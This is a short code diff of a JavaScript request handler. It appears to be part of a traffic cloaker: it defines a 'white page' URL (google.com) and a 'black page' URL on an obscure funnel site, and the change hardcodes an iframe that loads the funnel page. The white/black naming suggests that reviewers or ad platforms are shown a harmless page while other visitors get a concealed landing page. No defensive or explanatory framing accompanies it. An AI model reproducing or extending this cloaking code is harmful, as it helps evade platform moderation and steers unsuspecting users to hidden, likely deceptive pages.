@@ -4,10 +4,11 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://google.com";
     const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
+    
     const liveViewHTML = `
     <html>
         <body>
-            <iframe src="${iframeSrc}"></iframe>
+            <iframe src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
         </body>
     </html>
 `;
